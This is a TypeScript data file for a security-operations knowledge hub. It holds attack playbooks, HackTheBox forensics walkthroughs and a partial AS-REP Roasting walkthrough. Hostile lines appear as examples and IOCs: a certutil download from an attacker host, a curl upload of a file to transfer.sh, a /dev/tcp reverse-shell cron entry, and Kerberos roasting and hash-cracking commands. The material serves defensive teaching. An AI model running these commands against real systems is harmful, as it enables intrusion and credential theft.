// Knowledge Hub data — Attack summaries, mitigations, response playbooks, and forensics blogs
// Curated by Ahmed Tareq for SOCMind
import forensicsMemoryImg from '@/assets/forensics-memory.jpg';
import forensicsLogsImg from '@/assets/forensics-logs.jpg';
import forensicsNetworkImg from '@/assets/forensics-network.jpg';
import adAsrepHero from '@/assets/ad-asrep-hero.jpg';
import adAsrepFlow from '@/assets/ad-asrep-flow.jpg';
import adAsrepCrack from '@/assets/ad-asrep-crack.jpg';
import adKerberoastHero from '@/assets/ad-kerberoast-hero.jpg';
import adKerberoastFlow from '@/assets/ad-kerberoast-flow.jpg';
import adSilverTicketHero from '@/assets/ad-silverticket-hero.jpg';
import adSilverTicketFlow from '@/assets/ad-silverticket-flow.jpg';
import adGoldenTicketHero from '@/assets/ad-goldenticket-hero.jpg';
import adGoldenTicketFlow from '@/assets/ad-goldenticket-flow.jpg';
import adPthHero from '@/assets/ad-pth-hero.jpg';
import adPttHero from '@/assets/ad-ptt-hero.jpg';
import adDcShadowHero from '@/assets/ad-dcshadow-hero.jpg';
import adOverpassHero from '@/assets/ad-overpass-hero.jpg';
import adDelegationHero from '@/assets/ad-delegation-hero.jpg';

export interface MitreTechnique {
  id: string;
  name: string;
  url: string;
}

export interface AttackEntry {
  id: string;
  name: string;
  category: 'Initial Access' | 'Execution' | 'Persistence' | 'Credential Access' | 'Lateral Movement' | 'Exfiltration' | 'Impact';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  summary: string;
  howItWorks: string[];
  detection: string[];
  mitigation: string[];
  response: string[];
  mitre: MitreTechnique[];
  tools: string[];
}

export interface ForensicsBlog {
  id: string;
  slug: string;
  title: string;
  scenario: string;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  category: 'Memory Forensics' | 'Disk Forensics' | 'Network Forensics' | 'Log Analysis' | 'Malware Analysis';
  publishedAt: string;
  author: string;
  readingTime: number;
  labProvider: 'HackTheBox' | 'TryHackMe';
  labUrl: string;
  labName: string;
  coverImage: string;
  overview: string;
  investigationSteps: {
    title: string;
    description: string;
    commands?: string[];
    findings?: string;
  }[];
  ttps: {
    tactic: string;
    technique: string;
    techniqueId: string;
    description: string;
  }[];
  iocs: { type: string; value: string; context: string }[];
  conclusion: string;
  lessonsLearned: string[];
}

// =================== ATTACK PLAYBOOKS ===================

export const attackEntries: AttackEntry[] = [
  {
    id: 'phishing-credential-harvest',
    name: 'Phishing — Credential Harvesting',
    category: 'Initial Access',
    severity: 'High',
    summary:
      'Attackers send a crafted email with a fake login portal (Microsoft 365, Okta, banking) to steal user credentials and pivot into the corporate environment.',
    howItWorks: [
      'Threat actor registers a typo-squatted domain (e.g. micros0ft-login.com).',
      'Email is delivered with a sense of urgency (password expiry, invoice, HR notice).',
      'Victim clicks the link → fake portal mirrors the real login page.',
      'Credentials are POSTed to the attacker server and victim is redirected to the legitimate portal.',
      'Attacker uses harvested creds — often paired with MFA fatigue — to log into the real service.',
    ],
    detection: [
      'Email gateway alerts on newly registered look-alike domains.',
      'Sign-ins from impossible-travel locations or new ASNs.',
      'Multiple failed MFA push notifications followed by a successful one.',
      'User-Agent mismatch between historical and current sessions.',
    ],
    mitigation: [
      'Enforce phishing-resistant MFA (FIDO2 / WebAuthn).',
      'Enable Conditional Access with device compliance + named locations.',
      'Block newly observed domains at the proxy / DNS layer.',
      'Run quarterly phishing simulations and just-in-time training.',
      'Adopt DMARC reject + DKIM + SPF on every owned domain.',
    ],
    response: [
      'Revoke all active sessions for the impacted identity (Azure AD: Revoke-AzureADUserAllRefreshToken).',
      'Force password reset and re-enroll MFA factors.',
      'Hunt for OAuth app consent grants created in the past 30 days.',
      'Pull mailbox audit logs — look for inbox rules forwarding externally.',
      'Block sender domain at the secure email gateway and add hash to the IOC list.',
    ],
    mitre: [
      { id: 'T1566.002', name: 'Spearphishing Link', url: 'https://attack.mitre.org/techniques/T1566/002/' },
      { id: 'T1078', name: 'Valid Accounts', url: 'https://attack.mitre.org/techniques/T1078/' },
      { id: 'T1556.006', name: 'Multi-Factor Authentication', url: 'https://attack.mitre.org/techniques/T1556/006/' },
    ],
    tools: ['Evilginx2', 'Gophish', 'Modlishka'],
  },
  {
    id: 'ransomware-double-extortion',
    name: 'Ransomware — Double Extortion',
    category: 'Impact',
    severity: 'Critical',
    summary:
      'Modern ransomware crews exfiltrate data before encryption, then threaten to leak it on shame sites if the ransom is unpaid.',
    howItWorks: [
      'Initial access via VPN appliance vuln, RDP brute force, or phishing loader.',
      'Cobalt Strike / Sliver beacon deployed for persistence and C2.',
      'Active Directory enumeration with BloodHound / SharpHound.',
      'Privilege escalation to Domain Admin — typically via Kerberoasting or unpatched PrintNightmare.',
      'Data staged and exfiltrated via Rclone / MEGAsync to attacker cloud.',
      'Ransomware binary pushed via PsExec / GPO to all reachable hosts.',
    ],
    detection: [
      'Volume Shadow Copy deletion (vssadmin delete shadows /all /quiet).',
      'Mass file rename events on file servers (entropy spike).',
      'Outbound traffic to MEGA, Rclone user-agents, or unusual cloud storage.',
      'New service installations with random names across many hosts in a short window.',
    ],
    mitigation: [
      'Immutable, offline backups tested via quarterly restore drills.',
      'Network segmentation between user VLANs and crown-jewel servers.',
      'Application allow-listing on critical servers (WDAC / AppLocker).',
      'Disable SMBv1, restrict RDP to jump hosts only.',
      'Tier-0 admin model — separate accounts for DA, no email/web on those workstations.',
    ],
    response: [
      'Isolate infected hosts at the switch port — do NOT power off (preserve memory).',
      'Acquire memory + triage image of patient zero before remediation.',
      'Reset krbtgt twice (10-hour gap) to invalidate Golden Tickets.',
      'Engage legal, insurance, and law enforcement (FBI IC3 / CERT) before any ransom discussion.',
      'Rebuild from gold images — never decrypt-and-trust an infected host.',
    ],
    mitre: [
      { id: 'T1486', name: 'Data Encrypted for Impact', url: 'https://attack.mitre.org/techniques/T1486/' },
      { id: 'T1490', name: 'Inhibit System Recovery', url: 'https://attack.mitre.org/techniques/T1490/' },
      { id: 'T1567.002', name: 'Exfil to Cloud Storage', url: 'https://attack.mitre.org/techniques/T1567/002/' },
      { id: 'T1003', name: 'OS Credential Dumping', url: 'https://attack.mitre.org/techniques/T1003/' },
    ],
    tools: ['LockBit', 'BlackCat / ALPHV', 'Cobalt Strike', 'Mimikatz', 'Rclone'],
  },
  {
    id: 'lateral-movement-pth',
    name: 'Lateral Movement — Pass-the-Hash',
    category: 'Lateral Movement',
    severity: 'High',
    summary:
      'After dumping NTLM hashes from LSASS, an attacker authenticates to other Windows hosts without ever knowing the cleartext password.',
    howItWorks: [
      'Attacker compromises a workstation and elevates to local admin.',
      'Mimikatz / pypykatz dumps NTLM hashes from LSASS memory.',
      'Hashes are reused with tools like Impacket\'s wmiexec.py / smbexec.py.',
      'Attacker pivots laterally until a Domain Admin hash is found.',
      'Full domain compromise enables Golden Ticket creation.',
    ],
    detection: [
      'Event ID 4624 Logon Type 3 with NTLM authentication from a workstation.',
      'LSASS process access from non-standard binaries (Sysmon Event ID 10).',
      'Suspicious outbound SMB to many hosts in a short window.',
      'Hash reuse detected via honey-account tripwires.',
    ],
    mitigation: [
      'Enable Credential Guard (VBS) on all Windows 10/11 endpoints.',
      'Restrict local admin via LAPS — unique password per host.',
      'Block NTLM where possible; enforce Kerberos + AES.',
      'Tier-0/1/2 admin separation — never log a DA into a workstation.',
      'Protected Users group + "Account is sensitive and cannot be delegated" on privileged accounts.',
    ],
    response: [
      'Force-reset every account that logged into the compromised host.',
      'Reset krbtgt twice if any DA hash may have been exposed.',
      'Pull Sysmon + 4624/4625 logs for a full lateral-movement timeline.',
      'Re-image compromised hosts — don\'t trust AV cleanup of LSASS injection.',
    ],
    mitre: [
      { id: 'T1550.002', name: 'Pass the Hash', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { id: 'T1003.001', name: 'LSASS Memory', url: 'https://attack.mitre.org/techniques/T1003/001/' },
      { id: 'T1021.002', name: 'SMB / Admin Shares', url: 'https://attack.mitre.org/techniques/T1021/002/' },
    ],
    tools: ['Mimikatz', 'Impacket', 'CrackMapExec', 'Rubeus'],
  },
  {
    id: 'web-shell-rce',
    name: 'Web Shell via RCE',
    category: 'Execution',
    severity: 'Critical',
    summary:
      'An exposed web app vulnerability (deserialization, file upload, SSTI) is abused to drop a persistent web shell on the server.',
    howItWorks: [
      'Attacker scans for known CVEs (Log4Shell, ProxyShell, Confluence OGNL).',
      'PoC exploit returns code execution as the web service user.',
      'Small in-memory loader writes a .aspx / .jsp / .php shell to the web root.',
      'Shell provides a long-term backdoor surviving reboots.',
      'Attacker uses the shell to enumerate, dump creds, and pivot inward.',
    ],
    detection: [
      'New executable files in web-server document roots.',
      'Web server process spawning cmd.exe / bash / powershell.exe.',
      'Outbound connections originating from w3wp.exe or httpd.',
      'High entropy / obfuscated PHP/ASPX files (eval, base64_decode chains).',
    ],
    mitigation: [
      'Patch internet-facing apps within 72h of CVE disclosure.',
      'WAF with virtual-patch signatures for known web-app CVEs.',
      'Run web servers as least-privileged user, read-only doc root.',
      'File integrity monitoring on web roots (Tripwire / Wazuh FIM).',
    ],
    response: [
      'Snapshot the host (disk + memory) before any cleanup.',
      'Pull IIS / Apache / Nginx access logs for the past 90 days — look for the dropper request.',
      'Rotate all secrets stored on / accessible from the web host.',
      'Rebuild the web tier from a golden image; do not just delete the shell.',
    ],
    mitre: [
      { id: 'T1505.003', name: 'Web Shell', url: 'https://attack.mitre.org/techniques/T1505/003/' },
      { id: 'T1190', name: 'Exploit Public-Facing App', url: 'https://attack.mitre.org/techniques/T1190/' },
      { id: 'T1059', name: 'Command & Scripting Interpreter', url: 'https://attack.mitre.org/techniques/T1059/' },
    ],
    tools: ['China Chopper', 'Behinder', 'AntSword', 'Metasploit'],
  },
  {
    id: 'living-off-the-land',
    name: 'Living-off-the-Land (LOLBins)',
    category: 'Execution',
    severity: 'Medium',
    summary:
      'Attackers use signed Microsoft binaries (certutil, mshta, regsvr32, rundll32) to download payloads and evade traditional AV signatures.',
    howItWorks: [
      'Initial macro or LNK launches a LOLBin instead of a custom EXE.',
      'certutil -urlcache -split -f http://attacker/payload.bin downloads the second stage.',
      'mshta or rundll32 executes the payload, inheriting trust of the Microsoft binary.',
      'EDR signatures often whitelist these processes — alert volume is low.',
    ],
    detection: [
      'certutil with -urlcache or -decode arguments.',
      'mshta.exe with HTTP URL arguments.',
      'rundll32.exe spawning child processes from %TEMP%.',
      'PowerShell with -enc / -nop / -w hidden flags.',
    ],
    mitigation: [
      'Block known-bad LOLBin command-line patterns via ASR rules.',
      'Constrained Language Mode for PowerShell.',
      'AppLocker / WDAC scripts policy.',
      'Monitor parent-child process chains via Sysmon Event ID 1.',
    ],
    response: [
      'Capture command-line history and Sysmon events for the impacted host.',
      'Trace the originating document / email — block sender + hash.',
      'Hunt the binary hash across the entire EDR fleet.',
    ],
    mitre: [
      { id: 'T1218', name: 'Signed Binary Proxy Execution', url: 'https://attack.mitre.org/techniques/T1218/' },
      { id: 'T1059.001', name: 'PowerShell', url: 'https://attack.mitre.org/techniques/T1059/001/' },
      { id: 'T1105', name: 'Ingress Tool Transfer', url: 'https://attack.mitre.org/techniques/T1105/' },
    ],
    tools: ['LOLBAS Project', 'Atomic Red Team', 'Covenant'],
  },
  {
    id: 'dns-tunneling-exfil',
    name: 'DNS Tunneling — Data Exfiltration',
    category: 'Exfiltration',
    severity: 'High',
    summary:
      'Sensitive data is base64-encoded and embedded into DNS queries, bypassing proxies that don\'t inspect port 53.',
    howItWorks: [
      'Attacker controls authoritative DNS for a domain (evil.com).',
      'Implant chunks data into subdomain labels: <chunk1>.evil.com, <chunk2>.evil.com.',
      'Each query reaches the attacker\'s DNS server, reassembling the data.',
      'Most networks allow outbound DNS unconditionally — perfect covert channel.',
    ],
    detection: [
      'Abnormally long DNS query lengths (>50 chars in a single label).',
      'High query volume to a single second-level domain.',
      'High entropy / random-looking subdomains.',
      'TXT record queries from non-mail systems.',
    ],
    mitigation: [
      'Force all internal DNS through inspecting resolvers (e.g. Cisco Umbrella, Cloudflare Gateway).',
      'Block direct outbound UDP/53 from endpoints.',
      'DNS query logging + analytics (passive DNS).',
      'Limit DNS query size and rate per host.',
    ],
    response: [
      'Sinkhole the malicious second-level domain at the resolver.',
      'Identify all hosts that queried the domain in the last 90 days.',
      'Capture full PCAP from suspect host for offline analysis.',
      'Treat the host as compromised — rotate any secrets it could access.',
    ],
    mitre: [
      { id: 'T1071.004', name: 'Application Layer Protocol: DNS', url: 'https://attack.mitre.org/techniques/T1071/004/' },
      { id: 'T1048', name: 'Exfil Over Alt Protocol', url: 'https://attack.mitre.org/techniques/T1048/' },
    ],
    tools: ['DNSCat2', 'Iodine', 'dnsteal'],
  },
];

// =================== FORENSICS BLOGS ===================

export const forensicsBlogs: ForensicsBlog[] = [
  {
    id: 'blog-htb-perfection',
    slug: 'htb-perfection-memory-forensics',
    title: 'Investigating an Insider Data Theft — HTB "Perfection" Walkthrough',
    scenario:
      'A finance employee was suspected of leaking quarterly revenue figures to a competitor. Their workstation memory was acquired right before they left the office. Our job: prove or disprove the theft using only the memory image.',
    difficulty: 'Medium',
    category: 'Memory Forensics',
    publishedAt: '2025-04-12',
    author: 'Ahmed Tareq',
    readingTime: 9,
    labProvider: 'HackTheBox',
    labName: 'Perfection — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Perfection',
    coverImage: forensicsMemoryImg,
    overview:
      'This Sherlock simulates a real DLP investigation. We are handed a Windows 10 memory dump (.mem) and a single question: "Did the user exfiltrate the Q3 revenue spreadsheet, and if so, how?" I worked the case with Volatility 3, Bulk Extractor, and a touch of strings-fu.',
    investigationSteps: [
      {
        title: 'Step 1 — Profile identification',
        description:
          'Volatility 3 auto-profiles modern Windows builds. Started with windows.info to confirm OS build and KDBG signature.',
        commands: ['vol -f memory.mem windows.info'],
        findings: 'Windows 10 22H2, build 19045 — confirmed modern Win10 profile, no manual symbol shimming required.',
      },
      {
        title: 'Step 2 — Process tree triage',
        description:
          'pstree gives the full parent-child chain. I was hunting for cloud-storage clients, terminals, and anything spawned by Office.',
        commands: ['vol -f memory.mem windows.pstree'],
        findings:
          'Found EXCEL.EXE → cmd.exe → curl.exe — a strong red flag. Office should never spawn cmd, let alone curl, in a finance workstation.',
      },
      {
        title: 'Step 3 — Reconstructing the curl command',
        description:
          'cmdline reveals the exact arguments passed to curl, including the destination URL and the file uploaded.',
        commands: ['vol -f memory.mem windows.cmdline | grep -i curl'],
        findings:
          'curl -F "file=@C:\\Users\\jdoe\\Documents\\Q3_Revenue.xlsx" https://transfer[.]sh/upload — direct evidence of exfiltration.',
      },
      {
        title: 'Step 4 — Network artifacts',
        description:
          'netscan correlates the curl process with the actual TCP session at the time of acquisition.',
        commands: ['vol -f memory.mem windows.netscan'],
        findings:
          'Established session from PID 4812 (curl.exe) → 144.76.136.153:443 — IP belongs to transfer.sh. Timestamps line up with the cmdline.',
      },
      {
        title: 'Step 5 — Carving the spreadsheet',
        description:
          'Bulk Extractor + foremost on the raw memory pulled fragments of the Q3 spreadsheet, proving the file was open in memory at exfil time.',
        commands: ['bulk_extractor -o out memory.mem', 'foremost -t xlsx -i memory.mem -o carved/'],
        findings: 'Recovered partial XLSX OLE header containing the string "Q3 Revenue Forecast — Confidential".',
      },
    ],
    ttps: [
      {
        tactic: 'Collection',
        technique: 'Data from Local System',
        techniqueId: 'T1005',
        description: 'User accessed the Q3 spreadsheet from a local Documents folder.',
      },
      {
        tactic: 'Exfiltration',
        technique: 'Exfiltration Over Web Service',
        techniqueId: 'T1567.002',
        description: 'transfer.sh used as a free anonymous file-drop service.',
      },
      {
        tactic: 'Execution',
        technique: 'Command and Scripting Interpreter — Windows Command Shell',
        techniqueId: 'T1059.003',
        description: 'cmd.exe spawned by Excel via a malicious macro embedded in a "review" workbook.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '144.76.136.153', context: 'transfer.sh upload endpoint' },
      { type: 'Domain', value: 'transfer.sh', context: 'Exfiltration destination' },
      { type: 'Filename', value: 'Q3_Revenue.xlsx', context: 'Exfiltrated asset' },
      { type: 'Process Chain', value: 'EXCEL.EXE → cmd.exe → curl.exe', context: 'Anomalous parent-child' },
    ],
    conclusion:
      'Memory forensics gave us a complete, defensible timeline within 30 minutes — process tree, command line, network session, and a carved fragment of the stolen file. The user was confronted with the artifacts and admitted the theft. Disk forensics later corroborated the macro source.',
    lessonsLearned: [
      'Never let Office spawn shell interpreters — block via ASR rule "Block Office apps from creating child processes".',
      'Block known anonymous file-share services at the proxy.',
      'Acquire memory before disk in insider cases — volatile artifacts are the most damning.',
    ],
  },
  {
    id: 'blog-htb-brutus',
    slug: 'htb-brutus-log-analysis',
    title: 'Cracking an SSH Brute-Force Campaign — HTB "Brutus" Walkthrough',
    scenario:
      'A Linux jump host showed a suspicious spike in CPU. The SOC pulled auth.log, wtmp, btmp, and bash history. We must reconstruct the attacker\'s timeline: brute-force window, the cracked account, and any post-compromise persistence.',
    difficulty: 'Easy',
    category: 'Log Analysis',
    publishedAt: '2025-03-28',
    author: 'Ahmed Tareq',
    readingTime: 7,
    labProvider: 'HackTheBox',
    labName: 'Brutus — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Brutus',
    coverImage: forensicsLogsImg,
    overview:
      'A pure log-analysis Sherlock — no binaries, no memory, just text files. The lesson: 90% of intrusions can be reconstructed from auth.log if you know what to grep for.',
    investigationSteps: [
      {
        title: 'Step 1 — Establishing the brute-force window',
        description:
          'Counted "Failed password" entries per minute to find the attack burst.',
        commands: ['grep "Failed password" auth.log | awk \'{print $1, $2, $3}\' | uniq -c | sort -rn | head'],
        findings: '312 failed attempts between 04:13 and 04:19 UTC, all targeting user "root" from 65.2.161.68.',
      },
      {
        title: 'Step 2 — Identifying the successful login',
        description:
          'Filtered for "Accepted" entries within the same window from the same source IP.',
        commands: ['grep "Accepted" auth.log | grep "65.2.161.68"'],
        findings: 'Accepted password for root from 65.2.161.68 port 41420 — 04:19:42 UTC. The attacker burned ~6 minutes.',
      },
      {
        title: 'Step 3 — Mapping the session to wtmp',
        description:
          'last -f wtmp confirmed the live shell session and its duration.',
        commands: ['last -f wtmp -F'],
        findings: 'root pts/1 65.2.161.68 — Mar 6 04:19 still logged in (08:42 duration).',
      },
      {
        title: 'Step 4 — Persistence hunting',
        description:
          'Compared bash history, /etc/passwd, /etc/shadow, and crontab against the attack window.',
        commands: ['stat /etc/passwd /etc/shadow', 'cat /var/spool/cron/*', 'cat ~root/.bash_history'],
        findings:
          '/etc/passwd modified at 04:21:33. New user "cmnatic" added with UID 0. A reverse-shell cron entry runs every 5 minutes.',
      },
      {
        title: 'Step 5 — Eviction recommendations',
        description:
          'Documented every artifact for the IR ticket and proposed eviction steps.',
        findings:
          'Disable password auth on SSH, remove cmnatic, kill the cron, rotate root keys, and rebuild — UID 0 backdoor cannot be trusted.',
      },
    ],
    ttps: [
      {
        tactic: 'Credential Access',
        technique: 'Brute Force — Password Guessing',
        techniqueId: 'T1110.001',
        description: '312 failed root logins in 6 minutes from a single source IP.',
      },
      {
        tactic: 'Persistence',
        technique: 'Create Account — Local',
        techniqueId: 'T1136.001',
        description: 'Backdoor account "cmnatic" added to /etc/passwd with UID 0.',
      },
      {
        tactic: 'Persistence',
        technique: 'Scheduled Task/Job — Cron',
        techniqueId: 'T1053.003',
        description: 'Reverse-shell cron entry executing every 5 minutes.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '65.2.161.68', context: 'Brute-force + interactive C2' },
      { type: 'Username', value: 'cmnatic', context: 'Backdoor account UID 0' },
      { type: 'Cron', value: '*/5 * * * * /bin/bash -i >& /dev/tcp/65.2.161.68/4444 0>&1', context: 'Persistence' },
    ],
    conclusion:
      'Brutus reinforced the basics: never expose SSH password auth to the public internet, monitor auth.log for failure spikes, and treat any new UID-0 account as catastrophic. Total investigation time: 22 minutes from log handoff to written report.',
    lessonsLearned: [
      'Disable password authentication on SSH; enforce keys + MFA.',
      'Fail2Ban / CrowdSec is a free, effective brute-force mitigation.',
      'Forward auth.log to a central SIEM — do not rely on the host that was attacked.',
    ],
  },
  {
    id: 'blog-htb-tracer',
    slug: 'htb-tracer-network-forensics',
    title: 'Tracing a C2 Beacon Through PCAP — HTB "Tracer" Walkthrough',
    scenario:
      'An EDR alert flagged abnormal beacon-like traffic from a developer workstation. The SOC captured a 12-minute PCAP. Our mission: identify the C2 framework, decode the beacon, and pull any exfiltrated data.',
    difficulty: 'Hard',
    category: 'Network Forensics',
    publishedAt: '2025-02-19',
    author: 'Ahmed Tareq',
    readingTime: 11,
    labProvider: 'HackTheBox',
    labName: 'Tracer — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Tracer',
    coverImage: forensicsNetworkImg,
    overview:
      'A network-only Sherlock that mimics a real Cobalt Strike investigation. We worked the PCAP with Wireshark, Zeek, RITA, and a custom Python decoder for the obfuscated metadata.',
    investigationSteps: [
      {
        title: 'Step 1 — Top talkers and beacon detection',
        description:
          'Used RITA against the Zeek logs to find low-and-slow connections — the classic beacon footprint.',
        commands: ['zeek -r capture.pcap', 'rita import -i case zeek-logs/', 'rita show-beacons case'],
        findings:
          'Score 0.94 beacon: 10.10.10.42 → 167.71.207.89:443 — 117 connections, 60s ± 2s jitter — textbook Cobalt Strike default profile.',
      },
      {
        title: 'Step 2 — Confirming the C2 framework',
        description:
          'Pulled the JA3 / JA3S TLS fingerprints and compared against the Salesforce SSL Blacklist.',
        commands: ['tshark -r capture.pcap -Y "tls.handshake.type==1" -T fields -e tls.handshake.ja3'],
        findings: 'JA3 a0e9f5d64349fb13191bc491f9c23c79 — known Cobalt Strike Java client fingerprint.',
      },
      {
        title: 'Step 3 — Decoding the staged payload',
        description:
          'The first GET to /jquery-3.3.1.min.js returned an oversized JS file with appended encrypted shellcode (Malleable C2 jQuery profile).',
        commands: ['tshark -r capture.pcap -Y "http.request.uri==\\"/jquery-3.3.1.min.js\\"" --export-objects http,extracted/'],
        findings: 'Extracted 245KB stager — XOR key 0x69, decoded to Cobalt Strike beacon DLL (SHA256 a1b2…).',
      },
      {
        title: 'Step 4 — Recovering exfiltrated data',
        description:
          'Beacon HTTP POSTs to /submit.php carried base64-encoded metadata blocks. Wrote a 20-line Python script to decode them.',
        findings:
          'Decoded blocks revealed `whoami` output (corp\\jdoe), AD enumeration (net group "Domain Admins"), and a 4MB ZIP containing the user\'s SSH keys.',
      },
      {
        title: 'Step 5 — Building the IOC pack',
        description:
          'Documented C2 IP, JA3, URIs, XOR key, and beacon hash for distribution to the EDR + firewall teams.',
      },
    ],
    ttps: [
      {
        tactic: 'Command and Control',
        technique: 'Application Layer Protocol — Web Protocols',
        techniqueId: 'T1071.001',
        description: 'Cobalt Strike Malleable C2 over HTTPS using a jQuery profile.',
      },
      {
        tactic: 'Defense Evasion',
        technique: 'Obfuscated Files or Information',
        techniqueId: 'T1027',
        description: 'Single-byte XOR (0x69) to obscure stager and exfil blocks.',
      },
      {
        tactic: 'Discovery',
        technique: 'Domain Trust Discovery',
        techniqueId: 'T1482',
        description: 'net group "Domain Admins" enumeration via beacon.',
      },
      {
        tactic: 'Exfiltration',
        technique: 'Exfiltration Over C2 Channel',
        techniqueId: 'T1041',
        description: 'SSH keys and recon data POSTed back over the beaconing HTTPS session.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '167.71.207.89', context: 'Cobalt Strike Team Server' },
      { type: 'JA3', value: 'a0e9f5d64349fb13191bc491f9c23c79', context: 'CS Java client fingerprint' },
      { type: 'URI', value: '/jquery-3.3.1.min.js', context: 'Stager hosted on team server' },
      { type: 'URI', value: '/submit.php', context: 'Exfiltration endpoint' },
      { type: 'Crypto', value: 'XOR key 0x69', context: 'Stager + exfil obfuscation' },
    ],
    conclusion:
      'Tracer is a beautiful end-to-end network case: beacon detection (RITA) → framework attribution (JA3) → payload reversal (XOR) → exfil reconstruction (Python). Every defender should run this lab once a year — the muscle memory matters when a real beacon shows up at 3 AM.',
    lessonsLearned: [
      'Always feed PCAP into Zeek + RITA — beaconing is invisible to the human eye.',
      'JA3 fingerprints are gold for catching custom C2 frameworks.',
      'TLS inspection on egress is non-negotiable for high-value networks.',
    ],
  },
];

// =================== AD ATTACK ROOMS ===================

export interface AdAttackImage {
  src: string;
  caption: string;
}

export interface AdAttackStep {
  title: string;
  description: string;
  commands?: string[];
  image?: AdAttackImage;
  output?: string;
}

export interface CommandExplanation {
  command: string;
  purpose: string;
  breakdown: { flag: string; meaning: string }[];
  why: string;
}

export interface ToolExplanation {
  name: string;
  category: string;
  purpose: string;
  why: string;
  link?: string;
}

export interface SocDetectionItem {
  title: string;
  description: string;
  eventIds?: string[];
  dataSource?: string;
  query?: string;
  queryLanguage?: 'KQL' | 'SPL' | 'SQL' | 'EQL';
  severity?: 'Low' | 'Medium' | 'High' | 'Critical';
}

export interface AdAttackRoom {
  id: string;
  slug: string;
  name: string;
  shortName: string;
  category: 'Credential Access' | 'Privilege Escalation' | 'Lateral Movement' | 'Persistence' | 'Defense Evasion';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  publishedAt: string;
  author: string;
  readingTime: number;
  labProvider: 'HackTheBox' | 'TryHackMe';
  labName: string;
  labUrl: string;
  coverImage: string;
  summary: string;
  prerequisites: string[];
  attackFlow: string[];
  walkthrough: AdAttackStep[];
  commandsCheatsheet: { title: string; command: string; note?: string }[];
  commandExplanations: CommandExplanation[];
  toolsExplained: ToolExplanation[];
  enumerationDetection: SocDetectionItem[];
  socDetection: SocDetectionItem[];
  detection: string[];
  mitigation: string[];
  remediation: string[];
  mitre: MitreTechnique[];
  tools: string[];
  references: { title: string; url: string }[];
}

export const adAttackRooms: AdAttackRoom[] = [
  {
    id: 'ad-asrep-roasting',
    slug: 'ad-asrep-roasting',
    name: 'AS-REP Roasting — Active Directory Credential Access',
    shortName: 'AS-REP Roasting',
    category: 'Credential Access',
    severity: 'High',
    difficulty: 'Medium',
    publishedAt: '2025-05-01',
    author: 'Ahmed Tareq',
    readingTime: 12,
    labProvider: 'HackTheBox',
    labName: 'AS-REP Roasting — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adAsrepHero,
    summary:
      'AS-REP Roasting abuses Active Directory accounts that have Kerberos pre-authentication disabled. The KDC will hand out an AS-REP message containing material encrypted with the user\'s NT hash to anyone who asks — letting an attacker crack the password offline with hashcat or john, with zero traffic to the target.',
    prerequisites: [
      'Network reachability to a domain controller on TCP/UDP 88 (Kerberos).',
      'A list of valid AD usernames (no creds required).',
      'Impacket installed (GetNPUsers.py) or Rubeus on a compromised Windows host.',
      'A wordlist (rockyou.txt) and hashcat / john for offline cracking.',
    ],
    attackFlow: [
      'Enumerate AD users (LDAP, RPC, kerbrute, or a captured user list).',
      'Send AS-REQ packets without pre-authentication for each user.',
      'KDC returns an AS-REP for any account flagged DONT_REQ_PREAUTH (UAC bit 0x400000).',
      'Extract the encrypted timestamp blob — format $krb5asrep$23$user@DOMAIN:hash.',
      'Crack offline with hashcat -m 18200 to recover the cleartext password.',
      'Authenticate as the user and pivot deeper into the domain.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Enumerate domain users',
        description:
          'Before AS-REP Roasting, we need a list of valid usernames. In the HTB room we already have low-priv credentials, so we use Impacket\'s GetADUsers.py to pull every account from the directory.',
        commands: [
          'GetADUsers.py -all -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output:
          'sAMAccountName  Email  PasswordLastSet  LastLogon\nadministrator   -      2022-09-29 ...  2024-01-12\nhtb-student     -      2022-09-29 ...  2024-01-12\nbsmith          -      2022-09-29 ...  never logged on\n... (truncated)',
      },
      {
        title: 'Step 2 — Understand the Kerberos pre-auth check',
        description:
          'A normal AS-REQ ships an encrypted timestamp (PA-ENC-TIMESTAMP) proving the client knows the password. If the account has "Do not require Kerberos preauthentication" set, the KDC skips that check and replies with an AS-REP whose encrypted portion is derived from the user\'s NT hash — a perfect offline cracking target.',
        image: { src: adAsrepFlow, caption: 'Kerberos AS-REQ vs AS-REP — pre-auth disabled = roastable.' },
      },
      {
        title: 'Step 3 — Roast all accounts at once (Linux / Impacket)',
        description:
          'GetNPUsers.py with -request asks the KDC for AS-REPs for every account that allows it. With a username list we can do this fully unauthenticated.',
        commands: [
          'GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/',
          'GetNPUsers.py -request -outputfile asrep_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output:
          '[*] Getting TGT for mmorgan\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f...$3a78f...c2\n[-] User bsmith doesn\'t have UF_DONT_REQUIRE_PREAUTH set',
      },
      {
        title: 'Step 4 — Roast from a Windows foothold (Rubeus)',
        description:
          'When we already control a domain-joined host, Rubeus does the same thing natively over Kerberos with no Impacket dependency.',
        commands: [
          'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
          'Rubeus.exe asreproast /user:mmorgan /format:hashcat',
        ],
      },
      {
        title: 'Step 5 — Crack the AS-REP hash offline',
        description:
          'Mode 18200 in hashcat targets the etype 23 (RC4-HMAC) AS-REP blob. With rockyou.txt the weak passwords fall in seconds.',
        commands: [
          'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force',
          'john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt',
        ],
        image: { src: adAsrepCrack, caption: 'hashcat -m 18200 cracking $krb5asrep$23$ blob with rockyou.' },
        output:
